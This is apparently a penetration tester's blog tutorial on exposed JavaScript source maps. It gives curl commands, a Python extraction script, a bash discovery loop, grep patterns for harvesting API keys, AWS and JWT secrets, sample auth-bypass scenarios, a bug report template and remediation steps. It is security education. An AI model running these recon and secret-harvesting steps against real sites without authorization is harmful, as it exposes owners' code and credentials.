# Source Map File Exposure: Your Minified JS Ships with the Original Source

**Severity:** HIGH | **Category:** Recon | **Series:** #300DaysWithAppSec

---

## The Tool Meant for Developers, Weaponized by Attackers

JavaScript source maps were invented to solve a developer problem: when your code is minified and bundled for production, error messages point to line 1, column 47382 of a single massive file — completely useless for debugging.

Source maps solve this by creating a separate `.map` file that translates between minified code and the original source. When a developer opens DevTools in Chrome, the browser downloads the source map and shows the original readable code instead of minified gibberish.

The critical mistake: **when source maps are deployed to production servers, anyone can download them.** The same file that lets developers debug in Chrome lets attackers read your entire application source code — routes, business logic, hardcoded secrets, developer comments, and all.

---

## What a Source Map Contains

A source map is a JSON file with this structure:

```json
{
  "version": 3,
  "sources": [
    "src/components/Login.jsx",
    "src/api/auth.js",
    "src/config/api.js",
    "src/utils/adminHelpers.js",
    "src/api/adminRoutes.js"
  ],
  "sourcesContent": [
    "// FULL ORIGINAL SOURCE OF Login.jsx\nimport React from 'react';\n...",
    "// FULL ORIGINAL SOURCE OF auth.js\nconst API_KEY = 'sk_live_51Nxxx';\n...",
    "// FULL ORIGINAL SOURCE OF api.js\nexport const BASE_URL = 'https://api.target.com';\nexport const INTERNAL_URL = 'https://internal.target.com';\n...",
    "// FULL ORIGINAL SOURCE OF adminHelpers.js\n// TODO: Remove this admin bypass before production\nfunction skipAuthForAdmin() {...}\n...",
    "// FULL ORIGINAL SOURCE OF adminRoutes.js\nconst routes = ['/api/v2/admin/users', '/api/v2/admin/export', '/api/v2/admin/delete'];\n..."
  ],
  "mappings": "AAAA,OAAO,KAAK,MAAM..."
}
```

The `sourcesContent` array contains the **complete original source code of every file**. Every API call, every secret, every comment, every conditional auth bypass — all in plain text.

---

## How to Find Source Maps

### Step 1: Check for the SourceMappingURL Comment

Every minified JS file that has a source map includes a comment at the very end:

```bash
# Check the last line of any JS file
curl -s https://target.com/static/js/main.chunk.js | tail -5

# Output if source map exists:
# ... minified code ...
# //# sourceMappingURL=main.chunk.js.map

# Or inline base64 encoded (less common):
# //# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9u...
```

### Step 2: Download the Map File

```bash
# If you found: //# sourceMappingURL=main.chunk.js.map
# The map is at the same path with .map appended

curl -s https://target.com/static/js/main.chunk.js.map

# Check if it's accessible (HTTP 200 = jackpot)
curl -sk -o /dev/null -w "%{http_code}" \
    https://target.com/static/js/main.chunk.js.map
```

### Step 3: Parse the Source Map

```bash
# Download and format the JSON
curl -s https://target.com/static/js/app.js.map | python3 -m json.tool

# List all original source files
curl -s https://target.com/static/js/app.js.map | \
    python3 -c "
import json, sys
data = json.load(sys.stdin)
print('=== Original Source Files ===')
for src in data.get('sources', []):
    print(f'  {src}')
print(f'\nTotal files: {len(data.get(\"sources\", []))}')
"

# Output:
# === Original Source Files ===
#   webpack:///src/components/Login.jsx
#   webpack:///src/api/auth.js
#   webpack:///src/config/secrets.js    ← secrets.js?!
#   webpack:///src/utils/adminHelpers.js
#   webpack:///src/api/internal/adminRoutes.js   ← admin routes!
# Total files: 47
```

### Step 4: Extract All Source Code

```python
#!/usr/bin/env python3
"""Extract complete source code from a source map file"""
import json, sys, os, requests

MAP_URL = sys.argv[1] if len(sys.argv) > 1 else "https://target.com/app.js.map"

resp = requests.get(MAP_URL, verify=False)
data = resp.json()

sources = data.get('sources', [])
contents = data.get('sourcesContent', [])
output_dir = "./extracted_source"
os.makedirs(output_dir, exist_ok=True)

for i, source_path in enumerate(sources):
    # Clean the path
    clean_path = source_path.replace('webpack:///', '').replace('webpack://', '')
    clean_path = clean_path.lstrip('./')
    
    # Create directory structure
    full_path = os.path.join(output_dir, clean_path)
    os.makedirs(os.path.dirname(full_path), exist_ok=True)
    
    # Write source content
    if i < len(contents) and contents[i]:
        with open(full_path, 'w') as fh:
            fh.write(contents[i])
        print(f"Extracted: {clean_path}")

print(f"\nAll files extracted to {output_dir}/")
print("Now search for secrets:")
print("grep -rE 'api_key|secret|password|token|AWS|STRIPE' extracted_source/")
```

---

## Automated Discovery at Scale

### Finding All JS Files + Checking for Maps

```bash
#!/bin/bash
TARGET="${1:-https://target.com}"

echo "=== Source Map Discovery: $TARGET ==="

# Step 1: Get all JS file URLs
gau "$TARGET" --ft js 2>/dev/null | sort -u > /tmp/js_urls.txt
echo "[1] JS files found: $(wc -l < /tmp/js_urls.txt)"

# Step 2: Check each for sourceMappingURL
echo "[2] Scanning for source map references..."
while read url; do
    LAST_LINE=$(curl -sk "$url" 2>/dev/null | tail -3)
    MAP_URL=$(echo "$LAST_LINE" | grep -oE "sourceMappingURL=([^\s]+)" | cut -d'=' -f2)
    
    if [ -n "$MAP_URL" ]; then
        # Construct full map URL
        BASE_URL=$(echo "$url" | grep -oE "https?://[^/]+")
        JS_DIR=$(dirname "$url")
        
        if echo "$MAP_URL" | grep -q "^http"; then
            FULL_MAP_URL="$MAP_URL"
        else
            FULL_MAP_URL="$JS_DIR/$MAP_URL"
        fi
        
        # Check if map is accessible
        MAP_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$FULL_MAP_URL")
        if [ "$MAP_STATUS" = "200" ]; then
            echo "  VULNERABLE: $FULL_MAP_URL"
        else
            echo "  Map referenced but blocked [$MAP_STATUS]: $FULL_MAP_URL"
        fi
    fi
done < /tmp/js_urls.txt

# Step 3: nuclei scan for source maps
echo "[3] Running nuclei source map templates..."
nuclei -l /tmp/js_urls.txt -t exposures/files/sourcemap.yaml -silent 2>/dev/null
```

### sourcemapper Tool

```bash
# Install sourcemapper (purpose-built tool)
go install github.com/denandz/sourcemapper@latest

# Automatically downloads and extracts a source map
sourcemapper -output ./source_dump -url https://target.com/static/js/app.js.map

# Browse the extracted source
ls -la source_dump/
grep -rE "api_key|password|secret|token" source_dump/ | head -20
```

### unwebpack-sourcemap (Python)

```bash
# Install
pip3 install unwebpack-sourcemap --break-system-packages

# Extract source
unwebpack_sourcemap https://target.com/app.js.map ./extracted/
```

---

## What to Search for in Extracted Source

Once you have the source code, search systematically:

```bash
EXTRACTED="./extracted_source"

echo "=== Searching extracted source code ==="

echo "1. API Keys and Secrets:"
grep -rE "(api_key|apiKey|API_KEY|secret|SECRET|password|PASSWORD)\s*[=:]\s*['\"]" \
    "$EXTRACTED" | grep -v "^.*#" | head -20

echo "2. AWS Credentials:"
grep -rE "(AKIA[A-Z0-9]{16}|aws_secret_access_key)" "$EXTRACTED"

echo "3. JWT Secrets:"
grep -rE "(jwtSecret|JWT_SECRET|secretKey|signingKey)\s*[=:]\s*['\"]" "$EXTRACTED"

echo "4. API Endpoint Paths:"
grep -rE "['\"][/][a-zA-Z0-9/_{}?=-]{8,}['\"]" "$EXTRACTED" | \
    grep -iE "/api/|/admin/|/internal/" | sort -u | head -30

echo "5. Developer TODO Comments (often reveal security issues):"
grep -rn "TODO\|FIXME\|HACK\|XXX\|BYPASS\|TEMP\|REMOVE" "$EXTRACTED" | head -20

echo "6. Internal URLs and Services:"
grep -rE "(http|https)://[a-zA-Z0-9._-]*(internal|dev|staging|private)" "$EXTRACTED"

echo "7. Database Connection Strings:"
grep -rE "(mongodb|postgres|mysql|redis)://" "$EXTRACTED"
```

---

## Real-World Impact Scenarios

### Scenario 1: JWT Secret in Config File

```javascript
// Found in: src/config/auth.js (from source map)
const JWT_CONFIG = {
    secret: 'mySuper$ecretKey2024!',   // ← forge any JWT with this
    expiresIn: '24h',
    algorithm: 'HS256'
};
```

**Impact:** Forge admin JWT tokens → access any account → Critical

### Scenario 2: Undocumented Admin Routes

```javascript
// Found in: src/api/adminRoutes.js (from source map)
const ADMIN_ROUTES = {
    getAllUsers:     '/api/v2/admin/users/export',
    deleteUser:     '/api/v2/admin/users/delete',
    systemBackup:   '/api/v2/admin/backup/create',
    debugInfo:      '/api/v2/admin/debug/system-info'
};
```

**Impact:** All admin endpoints discovered → test auth on each → BFLA → Critical

### Scenario 3: Developer Bypass Comment

```javascript
// Found in: src/middleware/auth.js (from source map)
function verifyToken(req, res, next) {
    // TODO: REMOVE THIS BEFORE PRODUCTION
    if (req.headers['x-bypass-auth'] === 'dev-bypass-2024') {
        return next();  // ← auth bypass still in production!
    }
    // ... normal auth logic
}
```

**Impact:** `X-Bypass-Auth: dev-bypass-2024` header bypasses all auth → Critical

---

## The Bug Report

```
Title: JavaScript Source Map Files Accessible — Full Application Source Code Exposed

Severity: HIGH

Description:
JavaScript source map files are publicly accessible on the production server.
These files contain the complete, original (pre-minification) source code
of the application, including all API routes, business logic, configuration
values, and developer comments.

Accessible source map:
https://target.com/static/js/main.chunk.js.map

Steps to Reproduce:
1. Check last line of: curl -s https://target.com/static/js/main.chunk.js | tail -1
   Output: //# sourceMappingURL=main.chunk.js.map
2. Download map: curl -s https://target.com/static/js/main.chunk.js.map
3. Extract sources: python3 sourcemap_extract.py
4. 47 original source files recovered, including:
   - src/config/api.js (contains API keys)
   - src/api/adminRoutes.js (exposes admin endpoints)
   - src/middleware/auth.js (auth bypass in dev comment)

Impact:
Complete source code disclosure enables:
- Discovery of all API endpoints (documented and undocumented)
- Extraction of hardcoded credentials and API keys
- Identification of authentication bypass patterns
- Full understanding of business logic for targeted exploitation

Remediation:
Remove source map files from production server, or configure the web server
to deny access to *.map files. In webpack: set devtool: false for production.
```

---

## Key Takeaways

```
1. Source maps translate minified → original source — full source code exposed
2. Check: last line of any JS file for //# sourceMappingURL=
3. Map file = same URL as JS file + .map extension
4. sourcesContent array in the JSON = complete original source
5. Tools: sourcemapper, unwebpack-sourcemap, manual python3 extraction
6. Search for: API keys, JWT secrets, admin routes, bypass comments
7. Fix: devtool: false in webpack production config
8. Even if map is not directly exposed, sometimes base64 encoded inline
```

---

*Written by Anand Prajapati — Penetration Tester & Security Researcher*

🔗 **Connect & Follow:**
| Platform | Link |
|----------|------|
| 💼 LinkedIn | [linkedin.com/in/anand-prajapati-7a265a369](https://linkedin.com/in/anand-prajapati-7a265a369) |
| 🐙 GitHub | [github.com/anand87794](https://github.com/anand87794) |
| 🌐 Portfolio | [anandprajapati.lovable.app](https://anandprajapati.lovable.app) |
| 🐦 X | [@anand87794](https://x.com/anand87794) |

*Part of the #300DaysWithAppSec series — 300 vulnerabilities, real security education.*
